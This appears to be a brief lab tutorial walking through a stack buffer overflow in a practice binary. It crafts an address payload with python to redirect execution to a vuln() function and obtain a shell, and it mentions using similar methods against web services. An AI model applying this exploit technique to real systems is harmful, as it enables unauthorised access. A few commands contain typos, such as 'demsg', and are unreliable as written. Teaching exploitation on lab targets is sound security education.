Download the executable with:
    $ wget http://intranet.cs.usna.edu/~m164122/overflow1
Give it executable permission with:
    $ chmod u+x overflow1
Now, you can crash it by sending it a lot of "A"'s:
    $ python "print('A'*100)" | ./overflow1
If you check the log of the last crash (with $ demsg | tail), you can see
that the instruction pointer (ip) was a bunch of 41's. This is the ascii for 'A'.
Now, if you check out the disassembly with
    $ objdump -d -Mintel overflow1 | less
you can see that a function named "vuln" (the vulnerable function we want to 
execute) is located at a specific memory address: 0804845b.
Thus, to execute vuln(), we need to overwite ip with 0804845b. To do this,
first play around with the number of A's printed until you find the number
that writes A's right up to ip (you get this when it doesn't crash.)
Then, add hex for the address (in little endian) to that number of A's in order
to write the correct address. Better yet, make a payload file that will do it for us:
    $ python -c "print('\x5b\x84\x04\x08'*40)" > payload
Now, send the payload to overflow1 (the '-' in cat tells cat to output stdin after
outputing the payload file.):
    $ cat payload - | ./overflow1
This will print some funny text, but the program is still running. If you try
typing:
    ls
you'll see that it executes the ls command. In other words, you have shell!
This may not seem special now, but, in other situations where you don't have
a shell (for instance, when hacking a web service), similar methods can be used
to get into computers that you wouldn't otherwise have access to!

